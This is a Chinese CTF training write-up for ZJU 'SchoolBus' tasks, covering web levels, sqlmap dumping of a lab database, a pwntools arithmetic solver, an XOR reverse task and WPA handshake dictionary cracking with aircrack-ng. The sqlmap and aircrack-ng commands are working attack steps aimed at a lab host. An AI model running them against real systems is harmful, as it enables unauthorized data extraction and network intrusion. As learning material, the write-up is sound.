# ZJU SchoolBus Writeup

 Web

 EasyWeb

 第一关（.bak）

查看.bak文件

http://10.214.160.13:10000/1.php.bak

```html
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta http-equiv="Content-Language" content="zh-CN" />
</head>
<body>
<div align="center">
<h1>欢迎来到第一关</h1>
</div>
<!-- 删除1.php.bak -->
<a href="the2nd.php">进入第二关</a>
</body>
</html>
```

 第二关（XSS）

跨脚本漏洞XSS

[相关阅读](https://tech.meituan.com/2018/09/27/fe-security.html)

目前使用chrome破解失败了

好像firefox直接禁掉弹窗可以绕过去

 第三关（消息头）

网络$\to$ disiguan.php$\to$ Headers$\to$ Response Headers(wozaizheli.php)

 第四关

删掉选中行的display得到flag

![image-20211004085706027](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211004085706027.png)



 SQLinjection

在后台数据库中找一个名叫flag_is_here的表里的flag

 SQLMAP的使用

[基本操作](https://www.jianshu.com/p/63becdb8c2f8)

思路：获取数据库名称，得知所需要的表名，获取列名，获取指定列名字段

```shell

python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0
```

![image-20211003212834051](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003212834051.png)

```shell

python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 --dbs
```

![image-20211003212932141](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003212932141.png)

```shell

python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 --tables
```

![image-20211003220358984](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220358984.png)

```shell

python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here --column
```

![image-20211003220016540](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220016540.png)

```shell

sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here -C "flag" --dump
```

![image-20211003220044730](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220044730.png)

 PPC

 calculator

[基本操作](https://ce2191210307.gitee.io/2020/06/03/pwntools%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apwn%E5%85%A5%E9%97%A8/)

 Description

编程是最重要的技能，没有之一 
我就不信你的手速足够快hhh 
nc 10.214.160.13 11002 
nc是Linux自带的工具，用于与服务器建立socket连接

 Solution

[入门链接](https://ce2191210307.gitee.io/2020/06/03/pwntools%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apwn%E5%85%A5%E9%97%A8/)

注意bytes类和string类的区别与相互转换

```python
from pwn import *
p=remote('10.214.160.13',11002)
p.recvlines(7)
for i in range(10):
    s=p.recvuntil('=')
    s=bytes.decode(s)
    if i == 0:
        s=s[:-2]
    else:
        s=s[15:-2]
    sum=eval(s) 
    print(s)
    print(sum)
    sum = str.encode(str(sum))
    p.sendline(sum)
s=p.recvlines(4)
print(s)
```

 WUD1T1

大概就是根据题面给出的信息确定身份证的某几位，其他的暴力枚举

 md5加密

```python
import hashlib
def get_md5(s):
	md = hashlib.md5()
	md.update(s.encode('utf-8'))
	return md.hexdigest()
```

 Reverse

 Reverse1

一道简单的逆向题

flag加密存于内存区内，与Ch异或后取出值

```cpp



using namespace std;
void int2str(const int &int_temp,string &string_temp)  
{  
    char s;    
    s = (char)int_temp; 
    string_temp=s;  
}  
int main(){
    int x;
    string s="";
    while(1){
        scanf("%x",&x);
        x^=12;
        printf("%d %c\n",x, (char)x);
        string c;
        int2str(x,c);
        s+=c;
        cout<<s<<endl;
    }
} 
```

![image-20210929194118523](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20210929194118523.png)



 MISC

 WUD1T2

 aircrack-ng撞库

题目已给出握手包，直接用现有的字典库破解就行

```shell
aircrack-ng -w password.txt crack_zju-01.cap 
```

 vim .swp文件复原

```shell
vim -r 复原文件名（不带.swp）
```

